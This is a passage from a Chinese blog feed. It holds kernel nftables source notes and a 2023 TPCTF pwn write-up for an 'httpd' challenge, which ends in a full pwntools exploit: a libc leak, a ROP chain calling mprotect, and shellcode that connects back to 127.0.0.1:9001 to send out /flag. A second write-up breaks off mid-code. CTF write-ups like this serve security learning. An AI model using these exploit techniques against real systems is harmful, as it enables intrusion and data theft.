class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span> &#123;</span><br>NFT_PAYLOAD_LL_HEADER,<span class="hljs-comment">// 连接层header，如ethernet</span><br>NFT_PAYLOAD_NETWORK_HEADER, <span class="hljs-comment">// 网络层header，如IPv4或IPv6</span><br>NFT_PAYLOAD_TRANSPORT_HEADER, <span class="hljs-comment">// 传输层header，如UDP或TCP</span><br>NFT_PAYLOAD_INNER_HEADER, <span class="hljs-comment">// 里层header或者payload</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><strong>结构</strong></p><p>有select函数</p><ul><li><p>写packet使用 <strong>nft_payload_set_ops</strong></p></li><li><p>读packet</p><ul><li>读网络层或者传输层</li><li>len &lt;&#x3D; 4</li><li>len为2的次方</li><li>offset基于len对齐</li></ul><p>使用 <strong>nft_payload_fast_ops</strong></p><p>否则使用 <strong>nft_payload_ops</strong></p></li></ul><p>读写按是否有源 &#x2F; 目的寄存器判断</p><ul><li><p><strong>nft_payload_set</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8sreg;<br>u8csum_type;<br>u8csum_offset;<br>u8csum_flags;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>base：要改的header类型，见 <strong>nft_payload_bases</strong> 👆</p></li><li><p>offset：要改的的offset</p></li><li><p>len：要改的长度，无限制</p></li><li><p>sreg：data源寄存器</p></li><li><p>csum_type：checksum类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_csum_types</span> &#123;</span><br>NFT_PAYLOAD_CSUM_NONE,<span class="hljs-comment">// 没有checksum</span><br>NFT_PAYLOAD_CSUM_INET,<span class="hljs-comment">// IP协议checksum</span><br>NFT_PAYLOAD_CSUM_SCTP,  <span class="hljs-comment">// CRC-32c，SCTP中使用</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>csum_offset：checksum在header中的偏移</p></li><li><p>csum_flags：checksum的flags，只有一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_csum_flags</span> &#123;</span><br>NFT_PAYLOAD_L4CSUM_PSEUDOHDR = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>有其他值报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (flags &amp; ~NFT_PAYLOAD_L4CSUM_PSEUDOHDR)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>表示使用伪首部计算TCP checksum（四级校验）</p></li></ul></li><li><p><strong>nft_payload</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8dreg;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>base：要读的header类型</li><li>offset：要读的偏移</li><li>len：要读的长度，无限制</li><li>dreg：目的寄存器</li></ul></li></ul></li><li><p><strong>用途</strong> 读写packet的header</p><ul><li><p><strong>nft_payload_set_eval</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_payload_set_eval</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> nft_regs *regs,</span><br><span class="hljs-params"> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *<span class="hljs-title">skb</span> =</span> pkt-&gt;skb;<br><span class="hljs-type">const</span> u32 *src = &amp;regs-&gt;data[priv-&gt;sreg];<br><span class="hljs-type">int</span> offset, csum_offset;<br>__wsum fsum, tsum;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 获取header的offset</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (priv-&gt;base) &#123;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_LL_HEADER:<br><span class="hljs-keyword">if</span> (!skb_mac_header_was_set(skb))<br><span class="hljs-keyword">goto</span> err;<br>offset = skb_mac_header(skb) - skb-&gt;data;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_NETWORK_HEADER:<br>offset = skb_network_offset(skb);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_TRANSPORT_HEADER:<br><span class="hljs-keyword">if</span> (!(pkt-&gt;flags &amp; NFT_PKTINFO_L4PROTO) || pkt-&gt;fragoff)<br><span class="hljs-keyword">goto</span> err;<br>offset = nft_thoff(pkt);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_PAYLOAD_INNER_HEADER:<br>offset = nft_payload_inner_offset(pkt);<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 获取checksum的offset和要更改的offset</span><br><span class="hljs-comment">     */</span><br>csum_offset = offset + priv-&gt;csum_offset;<br>offset += priv-&gt;offset;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 计算更新checksum</span><br><span class="hljs-comment">     *    * 运输层四级校验或者IP校验</span><br><span class="hljs-comment">     *    * 要更改网络层或者数据链路层header，或者还未进行校验</span><br><span class="hljs-comment">     *    以上情况需要更新checksum</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> ((priv-&gt;csum_type == NFT_PAYLOAD_CSUM_INET || priv-&gt;csum_flags) &amp;&amp;<br>    ((priv-&gt;base != NFT_PAYLOAD_TRANSPORT_HEADER &amp;&amp;<br>      priv-&gt;base != NFT_PAYLOAD_INNER_HEADER) ||<br>     skb-&gt;ip_summed != CHECKSUM_PARTIAL)) &#123;<br>        <br>fsum = skb_checksum(skb, offset, priv-&gt;len, <span class="hljs-number">0</span>);<span class="hljs-comment">// 计算我们要更改部分的checksum</span><br>tsum = csum_partial(src, priv-&gt;len, <span class="hljs-number">0</span>);<span class="hljs-comment">// 计算我们要改成的内容的checksum</span><br><br>        <span class="hljs-comment">// IP校验，更新payload的checksum</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_type == NFT_PAYLOAD_CSUM_INET &amp;&amp;<br>    nft_payload_csum_inet(skb, src, fsum, tsum, csum_offset))<br><span class="hljs-keyword">goto</span> err;<br><br>        <span class="hljs-comment">// 四级校验，更新payload的checksum</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_flags &amp;&amp;<br>    nft_payload_l4csum_update(pkt, skb, fsum, tsum) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. 更改header</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (skb_ensure_writable(skb, max(offset + priv-&gt;len, <span class="hljs-number">0</span>)) ||<br>    skb_store_bits(skb, offset, src, priv-&gt;len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. 重新计算SCTP的checksum</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_type == NFT_PAYLOAD_CSUM_SCTP &amp;&amp;<br>    pkt-&gt;tprot == IPPROTO_SCTP &amp;&amp;<br>    skb-&gt;ip_summed != CHECKSUM_PARTIAL) &#123;<span class="hljs-comment">// 还没进行校验</span><br><span class="hljs-keyword">if</span> (pkt-&gt;fragoff == <span class="hljs-number">0</span> &amp;&amp;<br>    nft_payload_csum_sctp(skb, nft_thoff(pkt)))<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>err:<br>regs-&gt;verdict.code = NFT_BREAK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nft_payload_eval</strong></p><ul><li>获取绝对offset</li><li>读进目标寄存器</li><li>如果出错break</li></ul></li><li><p><strong>nft_payload_fast_eval</strong></p><ul><li>获取读取的指针ptr</li><li>判断ptr有没有越界</li><li>直接使用*，因为fast都是2的power</li></ul></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>rcu是什么</li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 TPCTF pwn wp</title>
    <link href="/2024/01/28/2023TPCTFpwnwp/"/>
    <url>/2024/01/28/2023TPCTFpwnwp/</url>
    
    <content type="html"><![CDATA[<p>o4赢但我爆零的一集，主题：洞呢？？？为什么找不到洞啊！！！</p><span id="more"></span><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>http要求👇</p><ul><li><p>Content-Length：指定data长度，POST方法必须有</p></li><li><p>Stdout：可以指定输出的fd</p></li><li><p>GET的可选url</p><ul><li><p>init</p><p>初始化root用户的passwd，新建一个user_note并插入</p></li><li><p>test</p><p>输出test123123</p></li><li><p>setlocale</p><p>调用setlocale</p></li><li><p>register</p><p>新建一个user_note，需要username，passwd，uid和lens</p></li><li><p>logoff</p><p>需要username和passwd，删除对应user_note</p></li><li><p>show</p><p>需要username和passw，输出对应user_note的内容</p></li><li><p>poweroff</p><p>退出</p></li></ul></li><li><p>POST可以输入note内容，需要usename和passwd</p></li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul><li><p>使用show功能输出user_note内容时最终会调用bad_400（输出400 BAD REQUEST的函数），将note-&gt;buffer中内容复制到s数组中</p><img src="/2024/01/28/2023TPCTFpwnwp/bad400.png" class title="bad400"><p>register可以申请的最大大小是0x400，s的大小是0x408，但root的note大小是0x4f8，可以溢出</p></li><li><p>root的密码是伪随机，可以预测</p><img src="/2024/01/28/2023TPCTFpwnwp/passwd.png" class title="passwd"><p>编一个这样的程序，需要的时候调用</p></li><li><p>show和更改note内容需要uid &#x3D;&#x3D; 0，还限制了uid !&#x3D; 0</p><img src="/2024/01/28/2023TPCTFpwnwp/uid.png" class title="uid"><p>但uid是根据 : 的个数判断的，我们可以输入形如 a​:b:0 的username，这样会把uid判定为0</p></li><li><p>setlocale有cve（第一次在pwn题见利用cve，孤陋寡闻了(lll￢ω￢)）</p><img src="/2024/01/28/2023TPCTFpwnwp/cve.png" class title="cve"><p>从poc可以看出在setlocale之后使用对齐有两字节的溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;locale.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (setlocale (LC_ALL, <span class="hljs-string">&quot;&quot;</span>))<br>    &#123;<br>      <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;1234567890123:\n&quot;</span>);<br>      <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;%0+ -&#x27;13ld:\n&quot;</span>, <span class="hljs-number">1234567L</span>);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>理论上应该输出👇</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">1234567890123:<br>+1,234,567   :<br><br>1234567890123:<br>+1,234,567     :<br></code></pre></td></tr></table></figure><p>但实际上👆</p><p>register中就使用了对齐</p><img src="/2024/01/28/2023TPCTFpwnwp/overflow.png" class title="overflow"><p>user_note结构体的布局👇</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span> *<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">char</span> *buffer;<br>    <span class="hljs-type">size_t</span> buffer_size;<br>&#125;<br></code></pre></td></tr></table></figure><p>name理论上最多31字节，溢出两字节，只要能溢出一个’\x00’到buffer指针就能修改别的堆块或者泄露地址（实测可以溢出一个空字节）</p><p>是否能触发似乎与要对齐的字符串长度有关</p></li><li><p>还要注意每次循环都会close(fd[0])，所以stdout和stderr最多泄露两次，不需要泄露的时候要通过Stdout重置fd</p></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><ul><li><p>改buffer指针到栈上写ROP链mprotect，改栈的权限为7</p></li><li><p>写shellcode进行connect后orw，另起一个nc监听端口</p><img src="/2024/01/28/2023TPCTFpwnwp/flag.png" class title="flag"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /init\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br>    rand=process(<span class="hljs-string">&#x27;./get_rand&#x27;</span>)<br>    value=rand.recv(<span class="hljs-number">13</span>)<br>    rand.close()<br>    <span class="hljs-keyword">return</span> value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setlocal</span>(<span class="hljs-params">data,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /setlocale?&#x27;</span>+data+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>(<span class="hljs-params">name,pawd,uid,size,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /register?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;&amp;uid=&#x27;</span>+<span class="hljs-built_in">str</span>(uid).encode()+<span class="hljs-string">b&#x27;&amp;len=&#x27;</span>+<span class="hljs-built_in">str</span>(size).encode()+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logoff</span>(<span class="hljs-params">name,pawd,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /logoff?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">name,pawd,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /show?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,pawd,data,fd</span>):<br>    http=<span class="hljs-string">b&#x27;POST /note?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nContent-Length: &#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode()+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br>    sleep(<span class="hljs-number">1</span>)<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_</span>():<br>    http=<span class="hljs-string">b&#x27;GET /poweroff\n&#x27;</span><br>    p.sendline(http)<br><br>p=process(<span class="hljs-string">&#x27;./httpd&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/home/eurus/ZZZCTF/tpctf/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>passwd=init(<span class="hljs-number">3</span>)<br>logoff(<span class="hljs-string">b&#x27;root&#x27;</span>,passwd,<span class="hljs-number">3</span>)<br>passwd=init(<span class="hljs-number">3</span>)<br>show(<span class="hljs-string">b&#x27;root&#x27;</span>,passwd,<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)[:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1f6ce0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br>setlocal(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;a:a:0&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x110</span>,<span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;b:b:0&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;c:c:0&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">3</span>)<br><br>environ_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>payload=p64(environ_addr)+p64(<span class="hljs-number">0x1000</span>)<br>edit(<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,payload,<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span>)<br>stack=u64(p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)[:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload=p64(stack-<span class="hljs-number">0x160</span>)+p64(<span class="hljs-number">0x1000</span>)<br>edit(<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,payload,<span class="hljs-number">3</span>)<br><br>rdi_addr=libcbase+<span class="hljs-number">0x240e5</span><br>rsi_addr=libcbase+<span class="hljs-number">0x2573e</span><br>rdx_addr=libcbase+<span class="hljs-number">0x26302</span><br>mprotect=libcbase+libc.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload=p64(rdi_addr)+p64(stack&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(rsi_addr)+p64(<span class="hljs-number">0x2000</span>)+p64(rdx_addr)+p64(<span class="hljs-number">7</span>)+p64(mprotect)<br>payload+=p64(stack-<span class="hljs-number">0x120</span>)<br>payload+=asm(shellcraft.connect(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9001</span>))<br>payload+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">2</span>,stack+<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,stack+<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x100</span>))<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,payload,<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="tpgc"><a href="#tpgc" class="headerlink" title="tpgc"></a>tpgc</h1><p>个人经验，c++不是用来逆的也不是用来看的(ˉ▽ˉ；)，主打一个盲猜</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一个菜单，有ruby，rod和weapon三个栈，功能</p><ul><li>add<ul><li>take_ruby：add，push ruby，可以输入name</li><li>take_rod：add，push rod，可以输入name</li><li>fuse：pop ruby，pop rod add，push weapon，可以输入name</li></ul></li><li>delete<ul><li>drop_ruby：pop，delete ruby</li><li>drop_rod：pop，delete rod</li><li>drop：pop，delete weapon，push ruby，push rod</li></ul></li></ul><p>根据两个wp缩过的poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_ruby</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span 